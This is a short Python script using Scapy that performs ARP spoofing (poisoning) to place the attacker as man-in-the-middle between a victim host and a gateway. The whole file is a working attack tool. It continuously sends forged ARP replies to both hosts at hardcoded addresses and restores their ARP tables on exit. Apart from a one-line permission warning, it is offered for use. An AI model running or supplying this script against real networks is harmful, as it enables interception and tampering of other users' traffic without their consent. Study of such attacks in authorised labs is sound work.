"""
ARP Spoofer Script using Scapy

This script performs an ARP spoofing (poisoning) attack, allowing the attacker to become the man-in-the-middle 
between a victim and the gateway. It sends forged ARP replies to both the victim and the router, misleading 
them into associating the attacker's MAC address with the IP address of the other.

⚠️ WARNING: Use only in controlled environments with permission.

Features:
- Sends ARP replies every 2 seconds to maintain the spoof.
- Targets both victim and router.
- On termination (Ctrl+C), sends restoration ARP packets to fix ARP tables.

Configuration:
- Victim IP:        10.1.22.121
- Victim MAC:       00:11:22:33:44:55
- Gateway IP:       10.10.0.254
- Gateway MAC:      00:ff:93:ae:72:47

Dependencies:
- Requires `scapy` library (`pip install scapy`)
- Must be run with root privileges (for raw packet sending).
"""


from scapy.all import ARP, Ether, send, sniff
import time

# Define target and gateway
target_ip = "10.1.22.121"  # Target (victim) IP address
gateway_ip = "10.10.0.254"  # Gateway (router) IP address
target_mac = "00:11:22:33:44:55"  # Target MAC address (usually can be found using 'arp -a')
gateway_mac = "00:ff:93:ae:72:47"  # Gateway MAC address (same here, use 'arp -a' or discovery)

# Create the ARP response packet to poison the target
arp_response_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
arp_response_to_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

# Function to perform ARP spoofing continuously
def arp_spoof():
    while True:
        send(arp_response_to_target)  # Send ARP reply to target
        send(arp_response_to_gateway)  # Send ARP reply to gateway
        time.sleep(2)  # Send every 2 seconds to maintain the poison

# Function to restore ARP tables after attack
def restore_arp():
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=4)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=4)

try:
    print("Starting ARP spoofing...")
    arp_spoof()
except KeyboardInterrupt:
    print("Restoring ARP tables...")
    restore_arp()
    print("ARP tables restored.")
